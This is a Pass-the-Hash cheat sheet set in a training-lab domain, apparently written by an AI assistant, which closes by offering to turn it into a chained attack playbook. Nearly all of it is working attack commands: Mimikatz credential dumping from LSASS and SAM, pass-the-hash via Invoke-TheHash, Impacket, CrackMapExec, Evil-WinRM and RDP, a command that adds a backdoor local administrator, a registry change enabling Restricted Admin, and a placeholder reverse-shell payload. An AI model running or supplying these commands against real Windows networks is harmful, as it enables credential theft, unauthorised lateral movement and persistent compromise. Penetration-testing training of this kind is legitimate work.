

## Concept

- Use **NTLM hashes** instead of plaintext passwords.
    
- Authenticate and execute commands across Windows systems.
    
- Useful for lateral movement within Active Directory networks.
    

---

## Pass the Hash Methods

### 1. Mimikatz (Windows)

Dump hashes:

```
mimikatz.exe privilege::debug sekurlsa::logonpasswords
mimikatz.exe privilege::debug token::elevate lsadump::sam
```

Pass-the-Hash:

```
mimikatz.exe privilege::debug sekurlsa::pth /user:david /domain:inlanefreight.htb /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /run:cmd.exe exit
```

→ Launches `cmd.exe` as target user.

---

### 2. Invoke-TheHash (Windows PowerShell)

Import:

```
Import-Module .\Invoke-TheHash.psd1
```

SMB Exec:

```
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

WMI Exec (with reverse shell):

```
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<Base64 PowerShell Payload>"
```

---

### 3. Impacket (Linux)

PsExec:

```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Other modules:

- `impacket-wmiexec`
    
- `impacket-atexec`
    
- `impacket-smbexec`
    

---

### 4. CrackMapExec (Linux)

Authenticate:

```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Execute command:

```
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

Output `Pwn3d!` = admin access.

---

### 5. Evil-WinRM (Linux)

Open PowerShell Remoting:

```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

---

### 6. RDP (Linux, Restricted Admin Mode)

Enable Restricted Admin Mode:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Pass-the-Hash via RDP:

```
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

---

## UAC Limitations for Local Accounts

- **LocalAccountTokenFilterPolicy = 0** → only built-in Administrator (RID-500) can do remote admin.
    
- **Set to 1** → other local admins allowed remote administration.
    
- **FilterAdministratorToken** may UAC-protect even the built-in Administrator.
    

---

Do you want me to merge this into a **PtH attack playbook** that chains: hash extraction → PtH (Mimikatz/Impacket/CME) → lateral movement?